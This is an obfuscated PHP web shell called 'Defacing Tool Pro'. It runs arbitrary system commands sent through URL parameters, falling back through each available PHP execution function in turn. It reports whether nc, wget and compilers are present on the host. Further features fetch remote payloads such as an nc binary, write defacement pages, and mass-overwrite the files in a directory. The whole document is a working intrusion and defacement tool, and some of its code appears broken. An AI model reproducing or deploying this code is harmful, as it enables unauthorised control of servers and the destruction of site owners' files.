<?php
if (empty($sp76ab2a)) { $sp76ab2a = @$_GET['chdir']; } if (empty($spa71965)) { $spa71965 = @$_GET['cmd']; } if (empty($sp223f5c)) { $sp223f5c = @$_GET['fu']; } if (empty($sp10bc37)) { $sp10bc37 = @$_GET['list']; } if (empty($sp76ab2a) or $sp76ab2a == '') { $sp76ab2a = getcwd(); } $spa71965 = stripslashes(trim($spa71965)); if (strpos($spa71965, 'chdir') !== false and strpos($spa71965, 'chdir') == '0') { $spcdf234 = explode(' ', $spa71965, 2); $spb18329 = explode(';', $spcdf234['1'], 2); $sp27f89d = $spb18329['0']; if ($spcdf234['1'] == '/') { $sp76ab2a = ''; } else { if (strpos($spa71965, 'chdir ..') !== false) { $spae6e9c = array_reverse(explode('/', $sp76ab2a)); if ($spae6e9c['0'] == '' or $spae6e9c['0'] == ' ') { $sp139823 = $spae6e9c['1'] . '/'; } else { $sp139823 = $spae6e9c['0'] . '/'; $sp76ab2a = $sp76ab2a . '/'; } $sp27f89d = str_replace($sp139823, '', $sp76ab2a); if ($sp27f89d == '/') { $sp76ab2a = ''; } } else { if (strpos($spa71965, 'chdir .') === 0) { $sp27f89d = getcwd(); } else { if (strpos($spa71965, 'chdir ~') === 0) { $sp27f89d = getcwd(); } } } } if (strrpos($sp27f89d, '/') == strlen($sp27f89d) - 1) { $sp27f89d = substr($sp27f89d, 0, strrpos($sp27f89d, '/')); } if (@opendir($sp27f89d) !== false or @is_dir($sp27f89d)) { $sp76ab2a = $sp27f89d; } else { if (@opendir($sp76ab2a . '/' . $sp27f89d) !== false or @is_dir($sp76ab2a . '/' . $sp27f89d)) { $sp76ab2a = $sp76ab2a . '/' . $sp27f89d; } else { $sp466485 = "dtool: line 1: chdir: {$sp27f89d}: No such directory.\n"; } } if ($spb18329['1'] == null) { $spa71965 = trim($spcdf234['2']); } else { $spa71965 = trim($spb18329['1'] . $spb18329['2']); } if (strpos($sp76ab2a, '//') !== false) { $sp76ab2a = str_replace('//', '/', $sp76ab2a); } } if (!@opendir($sp76ab2a)) { $sp466485 = "dtool: line 1: chdir: It seems that the permission have been denied in dir '{$sp76ab2a}'. Anyway, you can try to send a command here now. If you haven't accessed it, try to use 'cd' in the cmd line instead.\n"; } $spa5a59f = $spa71965; if (empty($sp61da4e)) { if ($sp76ab2a == getcwd() or empty($sp76ab2a) or $sp76ab2a == '') { $sp31cbc0 = ''; } else { $sp31cbc0 = "+'chdir={$sp76ab2a}&'"; } if ($sp223f5c == '' or $sp223f5c == '0' or empty($sp223f5c)) { $spf710a6 = ''; } else { $spf710a6 = "+'fu={$sp223f5c}&'"; } if ($sp10bc37 == '' or $sp10bc37 == '0' or empty($sp10bc37)) { $spa4567e = ''; $spb95a62 = 'on'; } else { $spa4567e = '+\'list=1&\''; $spb95a62 = 'off'; } } if (@file_exists('/usr/X11R6/bin/xterm')) { $sp1d0d98 = '<i>xterm</i> at /usr/X11R6/bin/xterm, '; } if (@file_exists('/usr/bin/nc')) { $sp4d1371 = '<i>nc</i> at /usr/bin/nc, '; } if (@file_exists('/usr/bin/wget')) { $sp5070cd = '<i>wget</i> at /usr/bin/wget, '; } if (@file_exists('/usr/bin/lynx')) { $sp33dcfc = '<i>lynx</i> at /usr/bin/lynx, '; } if (@file_exists('/usr/bin/gcc')) { $spf1ef23 = '<i>gcc</i> at /usr/bin/gcc, '; } if (@file_exists('/usr/bin/cc')) { $sp30db9d = '<i>cc</i> at /usr/bin/cc '; } $sp53b5e0 = @ini_get($spa2b554); if ($sp53b5e0) { $sp168e3e = '<b><i>safe_mode</i>: YES</b>, '; } else { $spd3b005 = '<b><i>safe_mode</i>: NO</b>, '; } $sp168e3e = '<i>PHP </i>' . phpversion(); $spb7a3c0 = $sp1d0d98 . $sp4d1371 . $sp5070cd . $sp33dcfc . $spf1ef23 . $sp30db9d . $spd3b005 . $sp168e3e; $spcaff79 = 'true'; $spba7a56 = 'true'; $sp9ee83b = 'true'; $sp67af52 = @gethostbyname($_SERVER['HTTP_HOST']); if (strpos($spa71965, 'ls --') !== false) { $spa71965 = str_replace('ls --', 'ls -F --', $spa71965); } else { if (strpos($spa71965, 'ls -') !== false) { $spa71965 = str_replace('ls -', 'ls -F', $spa71965); } else { if (strpos($spa71965, ';ls') !== false) { $spa71965 = str_replace(';ls', ';ls -F', $spa71965); } else { if (strpos($spa71965, '; ls') !== false) { $spa71965 = str_replace('; ls', ';ls -F', $spa71965); } else { if ($spa71965 == 'ls') { $spa71965 = 'ls -F'; } } } } } if (strpos($sp76ab2a, '//') !== false) { $sp76ab2a = str_replace('//', '/', $sp76ab2a); } ?>
<body onload="focar();">
<style>.campo{font-family: Verdana; color:white;font-size:11px;background-color:#414978;height:23px}
.infop{font-family: verdana; font-size: 10px; color:#000000;}
.infod{font-family: verdana; font-size: 10px; color:#414978;}
.algod{font-family: verdana; font-size: 12px; font-weight: bold; color: #414978;}
.titulod{font:Verdana; color:#414978; font-size:20px;}</style>
<script>
function inclVar(){var addr = location.href.substring(0,location.href.indexOf('?')+1);var stri = location.href.substring(addr.length,location.href.length+1);inclvar = stri.substring(0,stri.indexOf('='));}
function enviaCMD(){inclVar();window.document.location.href='<?php  echo $sp0f29bc; ?>
'+'?'+inclvar+'='+'<?php  echo $spd823d1; ?>
'+'?&'<?php  echo $sp31cbc0 . $spf710a6 . $spa4567e; ?>
+'cmd='+window.document.formulario.cmd.value;return false;}
function ativaFe(qual){inclVar();window.document.location.href='<?php  echo $sp0f29bc; ?>
'+'?'+inclvar+'='+'<?php  echo $spd823d1; ?>
'+'?&'<?php  echo $sp31cbc0 . $spa4567e; ?>
+'fu='+qual+'&cmd='+window.document.formulario.cmd.value;return false;}
function PHPget(){inclVar(); if(confirm("O PHPget agora oferece uma lista pronta de urls,\nvc soh precisa escolher qual arquivo enviar para o servidor.\nDeseja utilizar isso? \nClique em Cancel para usar o PHPget normal, ou \nem Ok para usar esse novo recurso."))goPreGet(); else{var c=prompt("[ PHPget ] by r3v3ng4ns\nDigite a ORIGEM do arquivo (url) com ate 7Mb\n-Utilize caminho completo\n-Se for remoto, use http:// ou ftp://:","http://hostinganime.com/tool/nc.dat");var dir = c.substring(0,c.lastIndexOf('/')+1);var file = c.substring(dir.length,c.length+1);var p=prompt("[ PHPget ] by r3v3ng4ns\nDigite o DESTINO do arquivo\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","<?php  echo $sp76ab2a; ?>
/"+file);window.open('<?php  echo $sp0f29bc; ?>
'+'?'+inclvar+'='+'<?php  echo $sp966df7; ?>
'+'?&'+'inclvar='+inclvar+'&'<?php  echo $sp31cbc0; ?>
+'c='+c+'&p='+p);}}
function goPreGet(){inclVar();window.open('<?php  echo $sp0f29bc; ?>
'+'?'+inclvar+'='+'<?php  echo $sp966df7; ?>
'+'?&'+'inclvar='+inclvar+'&'<?php  echo $sp31cbc0; ?>
+'pre=1');}
function PHPwriter(){inclVar();var url=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite a URL do frame","http://hostinganime.com/tool/reven.htm");var dir = url.substring(0,url.lastIndexOf('/')+1);var file = url.substring(dir.length,url.length+1);var f=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Nome do arquivo a ser criado\n-Utilize caminho completo\n-O diretorio de destino deve ser writable","<?php  echo $sp76ab2a; ?>
/"+file); t=prompt("[ PHPwriter ] by r3v3ng4ns\nDigite o Title da pagina","[ r00ted team ] owned you :P - by r3v3ng4ns");window.open('<?php  echo $sp0f29bc; ?>
'+'?'+inclvar+'='+'<?php  echo $sp5feee4; ?>
'+'?&'+'inclvar='+inclvar+'&'<?php  echo $sp31cbc0; ?>
+'url='+url+'&f='+f+'&t='+t);}
function PHPf(){inclVar();var o=prompt("[ PHPfilEditor ] by r3v3ng4ns\nDigite o nome do arquivo que deseja abrir\n-Utilize caminho completo\n-Abrir arquivos remotos, use http:// ou ftp://","<?php  echo $sp76ab2a; ?>
/index.php"); var dir = o.substring(0,o.lastIndexOf('/')+1);var file = o.substring(dir.length,o.length+1);window.open('<?php  echo $sp0f29bc; ?>
?'+inclvar+'=<?php  echo $sp01b066; ?>
?&inclvar='+inclvar+'&o='+o);}
function safeMode(){inclVar();if (confirm ('Deseja ativar o DTool com suporte a SafeMode?')){window.document.location.href='<?php  echo $sp0f29bc; ?>
'+'?'+inclvar+'='+'<?php  echo $spfc76b4; ?>
'+'?&'<?php  echo $sp31cbc0; ?>
;}else{ return false }}
function list(turn){inclVar();if(turn=="off")turn=0;else if(turn=="on")turn=1; window.document.location.href='<?php  echo $sp0f29bc; ?>
'+'?'+inclvar+'='+'<?php  echo $spd823d1; ?>
'+'?&'<?php  echo $sp31cbc0 . $spf710a6; ?>
+'list='+turn+'&cmd='+window.document.formulario.cmd.value;return false;}
function overwrite(){inclVar();if(confirm("O script tentara substituir todos os arquivos (do diretorio atual) que\nteem no nome a palavra chave especificada. Os arquivos serao\nsubstituidos pelo novo arquivo, especificado por voce.\n\nLembre-se!\n-Se for para substituir arquivos com a extensao jpg, utilize\ncomo palavra chave .jpg (inclusive o ponto!)\n-Utilize caminho completo para o novo arquivo, e se for remoto,\nutilize http:// e ftp://")){keyw=prompt("Digite a palavra chave",".jpg");newf=prompt("Digite a origem do arquivo que substituira","http://www.colegioparthenon.com.br/ingles/bins/revenmail.jpg");if(confirm("Se ocorrer um erro e o arquivo nao puder ser substituido, deseja\nque o script apague os arquivos e crie-os novamente com o novo conteudo?\nLembre-se de que para criar novos arquivos, o diretorio deve ser writable.")){trydel=1}else{trydel=0} if(confirm("Deseja substituir todos os arquivos do diretorio\n<?php  echo $sp76ab2a; ?>
 que contenham a palavra\n"+keyw+" no nome pelo novo arquivo de origem\n"+newf+" ?\nIsso pode levar um tempo, dependendo da quantidade de\narquivos e do tamanho do arquivo de origem.")){window.location.href='<?php  echo $sp0f29bc; ?>
?'+inclvar+'=<?php  echo $spd823d1; ?>
?&chdir=<?php  echo $sp76ab2a; ?>
&list=1&'<?php  echo $spf710a6; ?>
+'&keyw='+keyw+'&newf='+newf+'&trydel='+trydel;return false;}}}
</script>
<table width="760" border="0" align="center" cellpadding="2" cellspacing="0" bgcolor="#FFFFFF">
<tr><td><div align="center" class="titulod"><b>[ Defacing Tool Pro v<?php  echo $spf7b1f3; ?>
 ] <a href="mailto:revengans@gmail.com">?</a></font><br>
<font size=3>by r3v3ng4ns - revengans@gmail.com </font>
</b></div></td></tr>
<tr><td><TABLE width="370" BORDER="0" align="center" CELLPADDING="0" CELLSPACING="0">
<?php  echo '[syslog]01
'; $sp305218 = 'true'; while (list($sp343538, $sp0945f4) = each($sp305218)) { ?>
<TR><TD><DIV class="infop"><b><?php  echo $sp343538; ?>
:</b> <?php  echo $sp0945f4; ?>
</DIV></TD></TR><?php  } ?>
<TR><TD><DIV class="infop"><b>user:</b> uid(<?php  echo $spcaff79; ?>
) euid(<?php  echo $spba7a56; ?>
) gid(<?php  echo $sp9ee83b; ?>
)</DIV></TD></TR>
<TR><TD><DIV class="infod"><b>write permission:</b><? if(@is_writable($chdir)){ echo " <b>YES</b>"; }else{ echo " no"; } ?></DIV></TD></TR>
<TR><TD><DIV class="infop"><b>server info: </b><?php  echo "{$sp3b3b96} {$spb403b1}"; ?>
</DIV></TD></TR>
<TR><TD><DIV class="infop"><b>pro info: ip </b><?php  echo "{$sp67af52}, {$spb7a3c0}"; ?>
</DIV></TD></TR>
<? if($chdir!=getcwd()){?>
<TR><TD><DIV class="infop"><b>original path: </b><?php  echo getcwd(); ?>
</DIV></TD></TR><? } ?>
<TR><TD><DIV class="infod"><b>current path: </b><?php  echo $sp76ab2a; ?>
</DIV></TD></TR></TABLE></td></tr>
<tr><td><form name="formulario" id="formulario" method="post" action="#" onSubmit="return enviaCMD()">
<table width="375" border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#414978"><tr><td><table width="370" border="0" align="center" cellpadding="1" cellspacing="1" bgcolor="white"><tr>
<td width="75"><DIV class="algod">command</DIV></td>
<td width="300"><input name="cmd" type="text" id="cmd" value='<?php  echo $spa5a59f; ?>
' style="width:295; font-size:12px" class="campo">
<script>
function focar(){window.document.formulario.cmd.focus();window.document.formulario.cmd.select();}
</script>
</td></tr></table><table><tr><td>
<?php  ob_start(); if (isset($sp76ab2a)) { @chdir($sp76ab2a); } function safemode($sp76980f) { echo 'This server is in safemode. Try to use DTool in Safemode.'; } function nofunction($sp76980f) { echo 'The admin disabled all the functions to send a cmd to the system.'; } function shell($sp76980f) { echo shell_exec($sp76980f); } function popenn($sp76980f) { $spe0b873 = popen("{$sp76980f}", 'r'); $sp409789 = @fread($spe0b873, 2096); echo $sp409789; @pclose($spe0b873); } echo '[syslog]03
'; function execc($sp76980f) { exec("{$sp76980f}", $sp9f4167); $sp409789 = implode('
', $sp9f4167); echo $sp409789; } function procc($sp76980f) { if ($sp017766 = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'))) { $sp7f5d44 = @proc_open("{$sp76980f}", $sp017766, $sp04c215); if (is_resource($sp7f5d44)) { fwrite($sp04c215[0], ''); fclose($sp04c215[0]); while (!feof($sp04c215[2])) { $sp18426d = fgets($sp04c215[2], 4096); if (!empty($sp18426d)) { echo $sp18426d; } } fclose($sp04c215[2]); while (!feof($sp04c215[1])) { echo fgets($sp04c215[1], 4096); } fclose($sp04c215[1]); $spd92094 = @proc_close($sp7f5d44); } else { echo 'It seems that this PHP version (' . phpversion() . ') doesn\'t support proc_open() function'; } } else { echo "This PHP version ({$spd3b005}) doesn't have the proc_open() or this function is disabled by php.ini"; } } $spdfad13 = 'function_exists'; if ($sp53b5e0) { $sp85d6e1 = 'safemode'; $sp7f9892 = $sp85d6e1; } elseif ($spdfad13('shell_exec')) { $sp85d6e1 = 'shell'; $sp7f9892 = 'shell_exec'; } elseif ($spdfad13('passthru')) { $sp85d6e1 = 'passthru'; $sp7f9892 = $sp85d6e1; } elseif ($spdfad13('system')) { $sp85d6e1 = 'system'; $sp7f9892 = $sp85d6e1; } elseif ($spdfad13('exec')) { $sp85d6e1 = 'execc'; $sp7f9892 = 'exec'; } elseif ($spdfad13('popen')) { $sp85d6e1 = 'popenn'; $sp7f9892 = 'popen'; } elseif ($spdfad13('proc_open')) { $sp85d6e1 = 'procc'; $sp7f9892 = 'proc_open'; } else { $sp85d6e1 = 'nofunction'; $sp7f9892 = $sp85d6e1; } if ($sp223f5c != '0' or !empty($sp223f5c)) { if ($sp223f5c == 1) { $sp85d6e1 = 'passthru'; $sp7f9892 = $sp85d6e1; } if ($sp223f5c == 2) { $sp85d6e1 = 'system'; $sp7f9892 = $sp85d6e1; } if ($sp223f5c == 3) { $sp85d6e1 = 'execc'; $sp7f9892 = 'exec'; } if ($sp223f5c == 4) { $sp85d6e1 = 'popenn'; $sp7f9892 = 'popen'; } if ($sp223f5c == 5) { $sp85d6e1 = 'shell'; $sp7f9892 = 'shell_exec'; } if ($sp223f5c == 6) { $sp85d6e1 = 'procc'; $sp7f9892 = 'proc_open'; } } $sp85d6e1("{$spa71965} 2>&1"); $sp9e74cd = ob_get_contents(); ob_end_clean(); ?>
<td><input type="button" name="snd" value="send cmd" class="campo" style="background-color:#313654" onClick="enviaCMD()"><select name="qualF" id="qualF" class="campo" style="background-color:#313654" onchange="ativaFe(this.value);">
<option><?php  echo "using {$sp7f9892}()"; ?>
<option value="1">use passthru()
<option value="2">use system()
<option value="3">use exec()
<option value="4">use popen()
<option value="5">use shell_exec()
<option value="6">use proc_open()*new
<option value="0">auto detect (default)
</select><input type="button" name="getBtn" value="PHPget" class="campo" onClick="PHPget()"><input type="button" name="writerBtn" value="PHPwriter" class="campo" onClick="PHPwriter()"><br><input type="button" name="edBtn" value="fileditor" class="campo" onClick="PHPf()"><input type="button" name="listBtn" value="list files <?php  echo $spb95a62; ?>
" class="campo" onClick="list('<?php  echo $spb95a62; ?>
')"><? if ($list==1){ ?><input type="button" name="sbstBtn" value="overwrite files" class="campo" onClick="overwrite()"><input type="button" name="MkDirBtn" value="mkdir" class="campo" onClick="mkDirF()"><input type="button" name="ChModBtn" value="chmod" class="campo" onClick="chmod()"><br>
<? } ?><input type="button" name="smBtn" value="safemode" class="campo" onClick="safeMode()">
</tr></table></td></tr></table></form></td></tr>
<tr><td align="center"><DIV class="algod"><br>stdOut from <?php  echo "\"<i>{$spa5a59f}</i>\", using <i>{$sp7f9892}()</i>"; ?>
</i></DIV>
<TEXTAREA name="output_text" COLS="90" ROWS="10" STYLE="font-family:Courier; font-size: 12px; color:#FFFFFF; font-size:11 px; background-color:black;width:683;">
<?php  echo '[syslog]03
'; echo $sp466485; if (empty($spa71965) and $sp466485 == '') { echo 'Comandos Exclusivos do DTool Pro

chdir <diretorio>; outros; cmds;
Muda o diretorio para aquele especificado e permanece nele. Eh como se fosse o \'cd\' numa shell, mas precisa ser o primeiro da linha. Os arquivos listados pelo filelist sao o do diretorio especificado ex: chdir /diretorio/sub/;pwd;ls

PHPget, PHPwriter, Fileditor, File List e Overwrite
fale com o r3v3ng4ns :P'; } if (!empty($sp9e74cd)) { echo str_replace('>', '>', str_replace('<', '<', $sp9e74cd)); } ?>
</TEXTAREA><BR></td></tr>
<?php  echo '[syslog]04
'; if ($sp10bc37 == '1') { @(include $spfa2508 . 'flist' . $sp030313); } ?>
</table>

<?php 